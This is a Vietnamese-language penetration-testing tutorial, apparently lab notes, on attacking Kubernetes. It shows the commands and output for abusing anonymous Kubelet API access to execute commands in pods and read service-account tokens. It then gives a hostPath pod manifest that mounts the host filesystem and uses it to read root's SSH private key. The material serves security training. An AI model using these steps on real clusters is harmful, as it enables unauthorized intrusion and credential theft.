`Kubernetes` (`K8s`) là nền tảng mã nguồn mở điều phối container (container orchestration), tự động hóa quá trình triển khai, mở rộng quy mô (scaling) và quản lý các containerized applications. Kiến trúc của K8s dựa trên mô hình chạy ứng dụng bên trong các môi trường cô lập gọi là **Pods** nhằm tối ưu hóa tài nguyên và nâng cao tính khả chuyển (portability).

Trong quá trình penetration testing, việc hiểu rõ các thành phần kiến trúc và cơ chế xác thực của Kubernetes là rất quan trọng để xác định các lỗ hổng cấu hình sai (misconfigurations) và thực hiện leo thang đặc quyền.

## K8s Concepts & Khác biệt với Docker

| Chức năng | Docker | Kubernetes |
| :--- | :--- | :--- |
| **Mục đích chính** | Nền tảng đóng gói container (Containerization) | Công cụ điều phối và quản lý cụm container (Orchestration) |
| **Scaling** | Thủ công (hoặc Docker Swarm ở mức cơ bản) | Tự động hóa hoàn toàn (Auto-scaling) |
| **Networking** | Single network cơ bản | Mô hình mạng phân tán phức tạp kèm Network Policies |
| **Storage** | Volumes cục bộ | Đa dạng các giải pháp lưu trữ phân tán / Persistent Volumes |

Mỗi `Pod` có thể chứa một hoặc nhiều container gắn kết chặt chẽ với nhau, hoạt động như một máy ảo độc lập trên node với IP và hostname riêng. K8s cung cấp sẵn các cơ chế Load Balancing, Service Discovery, Self-healing và quản lý truy cập thông qua **RBAC** (Role-Based Access Control).

## Kiến trúc Kubernetes (K8s Architecture)

Kiến trúc của Kubernetes chia làm hai nhóm thành phần chính:
- **Control Plane (Master Node):** Chịu trách nhiệm quản lý, điều phối và duy trì trạng thái mong muốn (desired state) của toàn bộ cụm cluster.
- **Worker Nodes (Minions):** Nơi trực tiếp chạy các ứng dụng được đóng gói trong Pods theo sự phân phối của Control Plane.

#### Các Service & Cổng dịch vụ quan trọng

| Service | TCP Ports | Chức năng |
| :--- | :--- | :--- |
| **etcd** | 2379, 2380 | Cơ sở dữ liệu key-value phân tán lưu trữ toàn bộ cấu hình và trạng thái của cluster |
| **API Server** (`kube-apiserver`) | 6443 | Điểm tiếp nhận trung tâm của mọi lệnh điều khiển và quản trị (REST API) |
| **Scheduler** | 10251 | Lập lịch và phân bổ Pods mới vào các Node thích hợp |
| **Controller Manager** | 10252 | Giám sát trạng thái cụm và thực thi các chu trình điều khiển tự động |
| **Kubelet API** | 10250 | Agent điều khiển trực tiếp trên từng worker node để quản lý các container |
| **Read-Only Kubelet API** | 10255 | API chỉ đọc trên node, thường không yêu cầu xác thực |

## Cơ chế Xác thực & Rủi ro Kubelet

Mọi tương tác với cluster đều thông qua `kube-apiserver` với các phương thức HTTP verbs (`GET`, `POST`, `PUT`, `DELETE`). K8s xác thực danh tính qua Client Certificates, Bearer Tokens hoặc Basic Auth, sau đó phân quyền bằng RBAC.

Tuy nhiên, agent **Kubelet** (chạy tại port `10250` hoặc `10255`) theo mặc định hoặc do cấu hình sai có thể cho phép **Anonymous Access** (`system:anonymous`). Khi đó, bất kỳ user nào trong mạng có thể gửi request đến Kubelet API mà không cần chứng thực, dẫn đến rò rỉ dữ liệu hoặc thực thi mã từ xa (RCE).

#### 1. Kiểm tra API Server (Port 6443)
Khi kết nối ẩn danh tới API Server, thông thường hệ thống sẽ từ chối truy cập:

```shell
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k
```

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}
```

#### 2. Khai thác Kubelet API để trích xuất Pods (Port 10250)
Nếu Kubelet API cho phép truy cập ẩn danh, chúng ta có thể trích xuất danh sách tất cả các Pods đang chạy cùng thông tin cấu hình nhạy cảm:

```shell
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .
```

Kết quả trả về chứa:
- Tên Pod, namespace, container images và image tags (giúp tìm lỗ hổng đã biết của phiên bản ứng dụng).
- Metadata (`uid`, `resourceVersion`) phục vụ việc trinh sát (reconnaissance).
- Thuộc tính `last-applied-configuration` có thể làm lộ credentials, API keys hoặc environment variables được cấu hình lúc deploy.

#### 3. Trinh sát nhanh bằng công cụ `kubeletctl`
Sử dụng công cụ `kubeletctl` giúp tương tác với Kubelet API thuận tiện hơn:

- **Liệt kê danh sách Pods và Namespace:**
```shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods
```

```text
┌────────────────────────────────────────────────────────────────────────────────┐
│ Pods from Kubelet                                                              │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

- **Quét tìm Pods có khả năng thực thi lệnh (RCE):**
```shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce
```

```text
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Node with pods vulnerable to RCE                                                                    │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │  +  │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │  -  │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

- **Thực thi command trực tiếp trong Pod:**
```shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

## Kubernetes Privilege Escalation

Từ một Pod đã có quyền RCE (hoặc chiếm được shell bên trong Pod), chúng ta có thể leo thang đặc quyền để chiếm quyền điều khiển toàn bộ cluster hoặc host node.

#### Bước 1: Trích xuất Service Account Token và CA Certificate
Mỗi Pod mặc định sẽ được gắn một Service Account token nằm trong thư mục `/var/run/secrets/kubernetes.io/serviceaccount/`:

```shell
# Trích xuất Service Account Token
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

# Trích xuất CA Certificate
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

#### Bước 2: Kiểm tra quyền hạn RBAC của Token
Sử dụng `kubectl` kết hợp với token và certificate vừa thu thập được để truy vấn danh sách quyền hạn (`auth can-i --list`):

```shell
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

```text
Resources                               Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
pods                                            []                  []               [get create list]
...SNIP...
```

> [!NOTE]
> Nếu Service Account sở hữu các verb `[create, get, list]` trên tài nguyên `pods`, chúng ta hoàn toàn có thể khởi tạo một Pod đặc quyền mới để can thiệp vào host system.

#### Bước 3: Tạo Pod độc hại Mount Host Filesystem (`privesc.yaml`)
Định nghĩa một Pod sử dụng `hostPath` để mount thư mục gốc (`/`) của host system vào thư mục `/root` bên trong container:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

#### Bước 4: Khởi tạo và kiểm tra Pod mới
```shell
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
pod/privesc created

cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
NAME      READY   STATUS    RESTARTS   AGE
nginx     1/1     Running   0          23m
privesc   1/1     Running   0          12s
```

#### Bước 5: Trích xuất SSH Key của Root trên Host System
Sau khi Pod `privesc` chạy thành công, chúng ta thực thi lệnh để đọc SSH private key của tài khoản `root` trên host:

```shell
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```

Sau khi có được SSH key, chúng ta lưu lại và đăng nhập thẳng vào host system với quyền `root` qua SSH để hoàn tất quá trình khai thác.
